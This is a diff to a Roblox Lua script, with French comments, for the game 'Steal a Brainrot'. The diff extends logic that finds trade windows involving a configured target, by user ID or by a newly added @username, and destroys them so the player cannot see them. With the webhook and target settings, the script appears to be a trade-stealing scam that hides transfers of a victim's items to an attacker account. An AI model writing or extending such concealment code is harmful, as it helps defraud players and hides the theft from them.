@@ -17,6 +17,7 @@ local GOOD_WEBHOOK = getgenv().WEBHOOK_URL or "WEBHOOK URL"
 local GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
 local TARGET_ID = getgenv().TARGET_ID or 0
+local TARGET_USERNAME = getgenv().TARGET_USERNAME or ""
 local DELAY_STEP = 1
 local TRADE_CYCLE_DELAY = 2
 
@@ -71,23 +72,30 @@ local function applyEverythingAfterTargetFound()
     end)
     cam.FieldOfView = 70
 
-    -- Cacher automatiquement les GUI de trade seulement pour les trades avec TARGET_ID
+    -- Cacher automatiquement les GUI de trade seulement pour les trades avec TARGET_ID ou TARGET_USERNAME
     local function handleGui(obj)
         if guiNames[obj.Name] then
             task.defer(function()
                 -- Attendre un peu que l'interface se charge
                 task.wait(0.5)
-                -- Essayer de trouver l'ID du joueur dans l'interface
+                -- Essayer de trouver l'ID ou le nom d'utilisateur du joueur dans l'interface
                 local tradeFrame = obj:FindFirstChild("Frame")
                 if tradeFrame then
-                    -- Chercher dans tous les descendants qui pourraient contenir l'ID
+                    -- Chercher dans tous les descendants qui pourraient contenir l'ID ou @username
                     for _, desc in ipairs(tradeFrame:GetDescendants()) do
                         if desc:IsA("TextLabel") or desc:IsA("TextButton") then
                             local text = desc.Text
-                            if text and text:find(tostring(TARGET_ID)) then
-                                -- C'est un trade avec TARGET_ID, cacher
-                                obj:Destroy()
-                                return
+                            if text then
+                                -- Vérifier l'ID
+                                if text:find(tostring(TARGET_ID)) then
+                                    obj:Destroy()
+                                    return
+                                end
+                                -- Vérifier le @username
+                                if TARGET_USERNAME ~= "" and text:find("@" .. TARGET_USERNAME) then
+                                    obj:Destroy()
+                                    return
+                                end
                             end
                         end
                     end
